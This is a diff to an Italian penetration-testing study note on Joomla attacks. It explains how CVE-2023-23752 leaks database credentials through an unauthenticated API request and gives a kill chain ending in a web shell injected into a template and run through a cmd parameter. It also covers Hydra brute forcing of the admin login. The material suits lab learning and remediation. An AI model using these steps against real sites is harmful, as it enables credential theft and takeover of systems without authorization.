@@ -1,3 +1,5 @@
+> [English](README.en.md) | **Italiano**
+
 # CMS Exploitation: Joomla & JoomScan
 
 > - **Fase:** Web Attack - CMS Exploitation (Joomla)
@@ -185,6 +187,79 @@ Con accesso admin al pannello Joomla:
 | `hydra` | Password cracker | CLI - Attiva | Brute force su `/administrator/` |
 | `metasploit` | Exploitation framework | CLI/GUI | Moduli specifici per CVE Joomla |
 | `curl` | HTTP client | CLI | Test manuale CVE-2023-23752 (singola richiesta GET) |
+
+---
+
+## Analisi a Basso Livello: Meccanica di CVE-2023-23752
+
+### API REST di Joomla e il Bypass dell'Autenticazione
+
+CVE-2023-23752 e un Improper Access Check nell'API REST di Joomla. Il problema risiede nel modo in cui Joomla gestisce il parametro `public` nelle richieste API:
+
+```
+Flusso normale (versione patchata >= 4.2.8):
+GET /api/index.php/v1/config/application
+-> 403 Forbidden (richiede autenticazione)
+
+Flusso vulnerabile (versione 4.0.0 - 4.2.7):
+GET /api/index.php/v1/config/application?public=true
+-> 200 OK + JSON con TUTTE le configurazioni
+
+Root cause:
+- L'API REST ha un middleware di autenticazione
+- Il parametro ?public=true bypassa il middleware
+- Il codice verifica: if ($app->get('public')) { skip_auth(); }
+- L'attaccante controlla il parametro che decide se autenticare
+
+Dati esposti nell'output JSON:
+- db_type, db_host, db_user, db_password  <- credenziali database
+- secret                                   <- chiave crittografica applicazione
+- db_prefix                                <- prefisso tabelle (utile per SQLi)
+- mailer, mailfrom                         <- configurazione email (phishing)
+- sitename, MetaDesc                       <- informazioni pubbliche
+```
+
+### Struttura del File configuration.php
+
+Il file `configuration.php` nella root di Joomla contiene tutte le configurazioni in una classe PHP. In caso di misconfiguration del web server, questo file puo essere accessibile direttamente:
+
+```php
+class JConfig {
+    public $db       = 'joomla_db';
+    public $user     = 'joomla_user';
+    public $password = 'P@ssw0rd123!';    // <-- target primario
+    public $host     = 'localhost';
+    public $secret   = 'aBcDeFgHiJkL...'; // <-- usata per token CSRF e session
+    public $tmp_path = '/var/www/tmp';     // <-- path disclosure
+    public $log_path = '/var/www/logs';    // <-- path disclosure
+}
+```
+
+I file di backup (`configuration.php.bak`, `configuration.php.old`, `configuration.php~`) sono un finding comune di JoomScan perche gli editor di testo li creano automaticamente e non vengono serviti come PHP dal web server.
+
+### Kill Chain Completa: da CVE-2023-23752 a RCE
+
+```
+1. Fingerprint   -> curl CHANGELOG.txt -> Joomla 4.2.6
+2. CVE Check     -> curl /api/.../config/application?public=true -> credenziali DB
+3. DB Access     -> mysql -u joomla_user -p -h target -> accesso diretto (se porta 3306 esposta)
+   OPPURE
+3b. Admin Login  -> credenziali DB == credenziali admin (password reuse)
+4. Template Edit -> Extensions -> Templates -> index.php -> inject web shell
+5. RCE           -> http://target/templates/cassiopeia/index.php?cmd=id
+```
+
+---
+
+## Esperienza di Laboratorio
+
+Il test di CVE-2023-23752 ha dimostrato quanto una singola richiesta curl possa essere devastante: l'intero contenuto di `configuration.php` restituito in formato JSON strutturato, senza autenticazione. Il CVSS ufficiale (5.3, Medium) e fuorviante: il punteggio non considera l'impatto a cascata del credential reuse, che nella pratica trasforma un information disclosure in un full compromise.
+
+Il confronto con WordPress ha evidenziato una differenza architetturale importante: WordPress non espone un'API REST per la configurazione (le credenziali sono solo in `wp-config.php` su filesystem), mentre Joomla dalla versione 4.x ha scelto di rendere la configurazione accessibile via API. Questa scelta di design ha introdotto un vettore di attacco che non esisteva nelle versioni precedenti.
+
+JoomScan ha trovato file di backup esposti (`configuration.php.bak`) che contenevano le stesse credenziali della CVE. Questo dimostra un principio operativo: anche se la CVE viene patchata, i file di backup restano accessibili e contengono le credenziali in chiaro. La remediation deve includere sia il patching che la pulizia dei file residui.
+
+Il brute force su `/administrator/` con Hydra ha richiesto l'adattamento della stringa di errore alla lingua del sito (italiano vs inglese). Questo e un problema comune con Hydra: la condizione di successo/fallimento dipende dal contenuto della risposta HTTP, che varia in base alla localizzazione. In ambienti multilingua, la condizione `S=` (success string) e piu affidabile della condizione `F=` (failure string).
 
 ---
 
